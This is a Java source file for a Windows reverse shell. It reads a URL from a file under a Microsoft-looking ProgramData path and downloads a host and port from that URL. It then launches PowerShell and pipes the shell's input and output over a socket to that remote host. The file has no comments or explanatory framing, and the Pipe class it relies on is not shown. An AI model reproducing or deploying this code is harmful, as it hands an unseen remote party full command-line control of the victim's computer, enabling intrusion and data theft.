package terminus;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Main {
	public static void main(String[] args) {
		
		try {
			String link = new String(Files.readAllBytes(Paths.get("C:\\ProgramData\\Microsoft\\W\\l")));
			
			String[] data = wget(link).split(" ");
			String host = data[0];
			int port = Integer.parseInt(data[1]);

			Process process = Runtime.getRuntime().exec("PowerShell.exe");
			
			InputStream pin = process.getInputStream();
			OutputStream pout = process.getOutputStream();

			Socket socket = new Socket(host, port);
			
			InputStream sin = socket.getInputStream();
			OutputStream sout = socket.getOutputStream();
			
			Pipe pipe1 = new Pipe(pin, sout);
			Pipe pipe2 = new Pipe(sin, pout);
			pipe1.start();
			pipe2.start();

			process.waitFor();
			socket.close();
			
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
			System.exit(1);
		}
	}
	
	public static String wget(final String URL) throws IOException {
	    String line = "", all = "";
	    URL myUrl = null;
	    BufferedReader in = null;
	    try {
	        myUrl = new URL(URL);
	        in = new BufferedReader(new InputStreamReader(myUrl.openStream()));

	        while ((line = in.readLine()) != null) {
	            all += line;
	        }
	    } finally {
	        if (in != null) {
	            in.close();
	        }
	    }

	    return all;
	}
} 
